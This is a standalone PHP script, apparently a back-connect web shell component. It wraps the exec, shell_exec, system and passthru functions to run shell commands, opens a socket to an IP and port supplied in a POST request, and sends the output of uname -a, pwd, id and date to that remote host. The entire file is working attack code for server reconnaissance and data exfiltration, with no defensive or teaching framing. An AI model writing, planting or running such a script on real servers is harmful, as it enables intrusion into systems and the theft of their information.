<?php
function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
   
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
  
    return(htmlspecialchars($output));
    
}
$ip = $_POST['ip']; 
$port=$_POST['port']; 
$sockfd=fsockopen($ip , $port); 
$pwd = exec_all("pwd");
$sysinfo = exec_all("uname -a");
$id = exec_all("id");
$dateAndTime = exec_all("time /t & date /T");
$len = 1337;

fputs($sockfd ,$sysinfo . "\n" );
fputs($sockfd ,$pwd . "\n" );
fputs($sockfd ,$id ."\n\n" );
fputs($sockfd ,$dateAndTime."\n\n" );
?>